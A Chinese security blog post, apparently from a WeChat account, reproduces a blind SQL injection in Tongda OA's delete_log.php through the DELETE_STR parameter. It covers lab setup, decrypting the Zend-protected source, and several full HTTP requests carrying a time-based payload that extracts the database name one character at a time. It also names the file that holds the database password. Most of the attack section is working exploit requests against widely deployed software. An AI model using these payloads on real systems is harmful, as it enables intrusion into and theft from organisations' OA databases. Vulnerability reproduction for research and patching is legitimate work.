<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Uhm6xmYmihRk0b0xVAzo7Q)

```
声明：该公众号分享的安全工具、漏洞复现和项目均来源于网络，仅供安全研究与学习之用，
如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。

```

漏洞描述:

  某达 OA 中发现一个漏洞，并被列为严重漏洞。该漏洞影响文件 general/system/seal_manage/dianju/delete_log.php 的未知代码。对参数 DELETE_STR 的操作会导致 sql 注入。该漏洞已向公众披露并可能被使用。升级到版本最新版本可以解决这个问题。建议升级受影响的组件。VDB-236182 是分配给此漏洞的标识符。

回复 4166 可获取环境下载地址，下载之后直接下一步安装即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpzib11Wvs5zZMF0h3QEicEFPnwRLjUQlRKlUkkCNApRUewNWmU4HXTdnA/640?wx_fmt=png)

到最后这步即安装成功，默认配置即可，如端口被占用可更换一个其他端口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqp6TFvJtOAAm7jhDnlq3lwr9zKINiaXbS0Q5fkdTkWNMHtQiblz060GYbg/640?wx_fmt=png)

安装之后访问网页 127.0.0.1 如图表示安装成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqp5AbM3acLRNFY0VgE55ncq9dwn7UdSCc7Z2djeyOAITMGhicfrLXAicFg/640?wx_fmt=png)

此时可以打开通达的安装目录查看源代码如图:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpGmHhIPA9j1S0VtbYkwHf5AoyK4btUNd8OTlicgRFAdic8FnDwFtwRIGQ/640?wx_fmt=png)

发现代码被使用 Zend 加密，可以使用工具进行解密

http://www.xsssql.com/wp-content/uploads/2023/08/Zend 解密工具 SeayDzend.zip

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpvbnTxh2ttSyd1rzhEmqwmCpX8OPTuhzfE0GI3icicMs15kuQGzic0TpFw/640?wx_fmt=png)

路径：general/system/seal_manage/dianju/delete_log.php

注入参数：$DELETE_STR

打开存在漏洞的源码如下:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpWTL6k5Rd3cL0GlkyWNnKGOAhVviaPeUuEkpYKFGClHl5MUUScZ06s1g/640?wx_fmt=png)

以下有效载荷可以确定数据库名称的第一个字符是 T，ascii 84 也对应于大写字母 T。这样，可以通过盲注入获得数据库名称和任何数据库信息。

测试 poc 如下 (该语句用于检测数据库第一个字符):

```
1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpDtsk09I8ebiazkibJFrkXJSAAwIJupcZibylORYxhNQAtyErWTh2V0wpQ/640?wx_fmt=png)

当我们把 84 换成 85 延时如下:

```
1)%20and%20(substr(DATABASE(),1,1))=char(85)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpzk0iaPv6qHM0aAiaAxcWkPcbWnPfictntKET85joUxibibaUlqoIz1bXU3g/640?wx_fmt=png)

连接数据库信息如图:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpnYwYKXODJxeMzl8KlXm3v1tTvvAZ2XsQojZE056EoDGqTFMVBea3gg/640?wx_fmt=png)

继续猜数据库第二位字符 POC 如下 ascii 68 对应大写字母 D:

```
GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),2,1))=char(68) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1 HTTP/1.1


Host: 192.168.8.187


Upgrade-Insecure-Requests: 1


User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36


Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


Referer: http://192.168.8.187/general/index.php?isIE=0&modify_pwd=0


Accept-Encoding: gzip, deflate


Accept-Language: zh-CN,zh;q=0.9


Cookie: PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb


Connection: close







```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpaMbWlhviclBhicSWCDsVAeQuBBm1ADicp6nwOyd4TQ5Edibf2k9npNgHAQ/640?wx_fmt=png)

换成 69 延时如图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpooR8DaviaXMUDtZIlM5PT2SQMa8oRknCY41jpEKu9j1mia8VoCl64Ghw/640?wx_fmt=png)

枚举数据库第三位 POC 如下:

```
GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),3,1))=char(95) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1 HTTP/1.1


Host: 192.168.8.187


Upgrade-Insecure-Requests: 1


User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36


Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


Referer: http://192.168.8.187/general/index.php?isIE=0&modify_pwd=0


Accept-Encoding: gzip, deflate


Accept-Language: zh-CN,zh;q=0.9


Cookie: PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb


Connection: close







```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqp9uctARbAwSS16a7B5sGK0MIgrw9c87ooXUDCqfIflnaMfGa4cvF5lg/640?wx_fmt=png)

第 4 位 POC 如下:

```
GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),4,1))=char(79) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1 HTTP/1.1


Host: 192.168.8.187


Upgrade-Insecure-Requests: 1


User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36


Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


Referer: http://192.168.8.187/general/index.php?isIE=0&modify_pwd=0


Accept-Encoding: gzip, deflate


Accept-Language: zh-CN,zh;q=0.9


Cookie: PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb


Connection: close







```

第 5 位

```
GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),5,1))=char(65) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1 HTTP/1.1


Host: 192.168.8.187


Upgrade-Insecure-Requests: 1


User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36


Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


Referer: http://192.168.8.187/general/index.php?isIE=0&modify_pwd=0


Accept-Encoding: gzip, deflate


Accept-Language: zh-CN,zh;q=0.9


Cookie: PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb


Connection: close







```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpxaI3gIEFQ0mDVTBLLpXSRaLiaZbTGmSQrKyEtFxr3xS9VicrgiaSic6D1A/640?wx_fmt=png)

猜解后对数据库名进行拼接为: TD_OA

另外通达 OA 安装后默认数据库密码位置为（每台机器的密码均不一样为随机生成的密码）:

```
通达安装目录/mysql5/my.ini

```

打开之后用记事本查看配置项 password = 即可，默认端口为 3336

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8pLcJKTvuiczJDu5gKH4kOhl8TbTFsqpuy1RyGdYzhQkyNibLbAsXj6BI2J4XcicCvPrX8R1L0uBzEaRDYPzibHJg/640?wx_fmt=png)

如需获取安装包或 php 解密工具欢迎添加作者微信 sqlxss 为好友

![](https://mmbiz.qpic.cn/mmbiz_jpg/h8pLcJKTvu95FhjXRVBYx82bgK9Mn50GMESeqXib2r1mz2ibWLW5wreGVX5TniapupaJoMGztKKmgbBI11Fja5YxQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)